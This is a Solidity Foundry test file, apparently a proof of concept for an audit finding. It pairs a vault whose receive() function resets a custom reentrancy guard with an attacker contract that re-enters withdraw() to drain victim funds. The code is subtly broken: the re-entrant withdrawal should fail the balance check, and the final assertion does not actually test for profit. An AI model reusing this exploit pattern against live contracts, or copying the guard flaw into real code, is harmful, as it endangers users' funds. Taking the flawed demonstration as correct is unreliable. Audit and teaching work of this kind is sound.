// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @title Reentrancy Guard Reset PoC
/// @notice Demonstrates how a receive() function can reset a custom reentrancy guard
/// @dev Based on Wise Lending 2024-02 (Code4rena H-01)

contract VulnerableVault {
    bool public sendingProgress;
    mapping(address => uint256) public balances;
    address public master;

    constructor() {
        master = msg.sender;
    }

    receive() external payable {
        if (msg.sender != address(0)) {
            _sendValue(master, msg.value);
        }
    }

    function _sendValue(address to, uint256 amt) internal {
        sendingProgress = true;
        (bool ok,) = payable(to).call{value: amt}("");
        sendingProgress = false; // ❌ resets the guard!
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amt) external {
        require(!sendingProgress, "reentrant");
        sendingProgress = true;
        require(balances[msg.sender] >= amt, "insufficient");
        balances[msg.sender] -= amt;
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok, "transfer failed");
        sendingProgress = false;
    }
}

contract GuardResetAttacker {
    VulnerableVault public vault;
    uint256 public reentrancyCount;

    constructor(VulnerableVault _v) {
        vault = _v;
    }

    receive() external payable {
        if (reentrancyCount < 1) {
            reentrancyCount++;
            // Send 1 wei to vault → triggers receive() → resets sendingProgress
            (bool ok,) = payable(address(vault)).call{value: 1}("");
            // Now guard is reset, re-enter withdraw
            vault.withdraw(1 ether);
        }
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }
}

contract ReentrancyGuardResetTest is Test {
    VulnerableVault vault;
    GuardResetAttacker attacker;
    address master = makeAddr("master");

    function setUp() public {
        vm.prank(master);
        vault = new VulnerableVault();
        attacker = new GuardResetAttacker(vault);

        // Seed vault with victim funds
        address victim = makeAddr("victim");
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
    }

    function testGuardResetAllowsReentrancy() public {
        vm.deal(address(attacker), 2 ether);

        uint256 attackerBalBefore = address(attacker).balance;
        uint256 vaultBalBefore = address(vault).balance;

        attacker.attack{value: 1 ether}();

        // Attacker should have extracted more than deposited
        assertGt(
            address(attacker).balance,
            attackerBalBefore - 1 ether,
            "Attacker should profit from reentrancy"
        );
    }
}
